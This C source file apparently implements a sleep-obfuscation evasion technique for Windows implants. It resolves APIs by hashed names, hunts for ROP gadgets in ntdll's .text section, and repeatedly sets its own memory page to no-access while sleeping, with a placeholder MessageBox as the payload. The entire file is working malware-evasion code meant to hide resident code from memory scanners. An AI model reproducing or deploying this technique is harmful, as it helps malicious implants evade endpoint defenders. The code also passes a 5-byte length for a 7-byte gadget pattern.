#include <windows.h>
#include "stdio.h"

#include "ApiResolve.h"

#define FAIL 0
#define SUCCESS 1

BOOL findGadget(byte pattern[], DWORD dwLenPattern, PVOID* ppGadgetAddress);

extern DWORD64 GetRIP(void);
extern BOOL DeepSleep(LPVOID, SIZE_T, DWORD, PDWORD, PVOID, PVOID, PVOID, PVOID, DWORD);

#ifdef _DEBUG
int main(int argc, char** argv) {
#else
int go(void){
#endif

    GETSYSTEMINFO _GetSystemInfo = (GETSYSTEMINFO)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETSYSTEMINFO);
    VIRTUALQUERYEX _VirtualQueryEx = (VIRTUALQUERYEX)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALQUERYEX);
    GETCURRENTPROCESS _GetCurrentProcess = (GETCURRENTPROCESS)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETCURRENTPROCESS);
    MESSAGEBOXA _messageBoxA = (MESSAGEBOXA)getFunctionPtr(CRYPTED_HASH_USER32, CRYPTED_HASH_MESSAGEBOXA);
    VIRTUALPROTECT _VirtualProtect = (VIRTUALPROTECT)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALPROTECT);
    SLEEP _Sleep = (SLEEP)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_SLEEP);

    DWORD dwSuccess = FAIL, dwOldProtect = 0;
    PVOID rip = NULL, gAddRsp32 = NULL, gSuper = NULL;

    PVOID myPage = NULL;
    DWORD myPageLength = 0;

    MEMORY_BASIC_INFORMATION mbi = { 0x00 };
    SYSTEM_INFO si = { 0x00 };
    BOOL bFound = FALSE;

    byte patternSuperGadget[] = { 0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3 };
    byte patternAddRsp32Pop[] = { 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5E, 0xC3 };

    bFound = findGadget(patternSuperGadget, 11, &gSuper);
    if (bFound == FALSE)
        goto exit;

    bFound = findGadget(patternAddRsp32Pop, 5, &gAddRsp32);
    if (bFound == FALSE)
        goto exit;

    rip = (PVOID)GetRIP();
    _GetSystemInfo(&si);
  
    LPVOID lpMem = 0;
   
    while (lpMem < si.lpMaximumApplicationAddress) {

        _VirtualQueryEx(_GetCurrentProcess(), lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

        if (rip >= mbi.BaseAddress && (DWORD64)rip <= (DWORD64)mbi.BaseAddress + mbi.RegionSize) {

            myPage = mbi.BaseAddress;
            myPageLength = mbi.RegionSize;
 
            break;
        }

        lpMem = (LPVOID)((DWORD64)mbi.BaseAddress + mbi.RegionSize);

    }
   
    while (1) {

        DeepSleep(myPage, myPageLength, PAGE_NOACCESS, &dwOldProtect,
            _VirtualProtect,
            _Sleep,
            gSuper,
            gAddRsp32,
            5000
        );

        char foo[] = { '1', 0x00 };
        _messageBoxA(0, foo, foo, 1);

    }

    dwSuccess = SUCCESS;

exit:

    return dwSuccess;

}

BOOL findGadget(byte pattern[], DWORD dwLenPattern, PVOID* ppGadgetAddress) {

    VIRTUALALLOC _VirtualAlloc = (VIRTUALALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYTPED_HASH_VIRTUALALLOC);
    VIRTUALFREE _VirtualFree = (VIRTUALFREE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALFREE);
    COPYMEMORY _CopyMemory = (COPYMEMORY)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_COPYMEMORY);
    GETMODULEHANDLE _GetModuleHandle = (GETMODULEHANDLE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_GETMODULEHANDLEA);
    LSTRCMPA _lstrcmpA = (LSTRCMPA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRCMPA);

    BOOL bSuccess = FALSE;
    PVOID pBufTextMemory = NULL;
    DWORD sizeText = 0;

    PIMAGE_DOS_HEADER pDosHdr = NULL;
    PIMAGE_NT_HEADERS pNtHdrs = NULL;
    PIMAGE_SECTION_HEADER pSectionHdr = NULL;
    HMODULE hNtdll = NULL;

    char ntdll[] = { 'n', 't', 'd','l','l','.', 'd','l','l', 0x00 };
    char text[] = { '.', 't','e','x','t', 0x00 };

    hNtdll = _GetModuleHandle(ntdll);
    if (hNtdll == NULL)
        goto exit;

    pDosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    pNtHdrs = (PIMAGE_NT_HEADERS)((byte*)hNtdll + pDosHdr->e_lfanew);
    pSectionHdr = (PIMAGE_SECTION_HEADER)((byte*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {

        if (_lstrcmpA((char*)pSectionHdr->Name, text) == 0) {

            pBufTextMemory = _VirtualAlloc(0, pSectionHdr->Misc.VirtualSize, MEM_COMMIT, PAGE_READWRITE);
            if (pBufTextMemory == NULL)
                goto exit;

            _CopyMemory(pBufTextMemory, (byte*)((byte*)hNtdll + pSectionHdr->VirtualAddress), pSectionHdr->Misc.VirtualSize);

            sizeText = pSectionHdr->Misc.VirtualSize;

            break;

        }

        pSectionHdr = (PIMAGE_SECTION_HEADER)((byte*)pSectionHdr + sizeof(IMAGE_SECTION_HEADER));

    }

    if (pBufTextMemory == NULL)
        goto exit;

    BOOL bFound = FALSE;
    int i = 0;
    for (i = 0; i < sizeText && bFound == FALSE; i++) {
        for (int j = 0; j < dwLenPattern; j++) {
            if (* ((byte*)pBufTextMemory + i + j) != pattern[j]) {
                bFound = FALSE;
                break;
            } else {
                bFound = TRUE;
            }
        }
    }

    if (bFound == FALSE)
        goto exit;

    *ppGadgetAddress = (byte*)hNtdll + pSectionHdr->VirtualAddress + i - 1;

    bSuccess = TRUE;

exit:

    if (pBufTextMemory)
        _VirtualFree(pBufTextMemory, 0, MEM_RELEASE);

    return bSuccess;

}
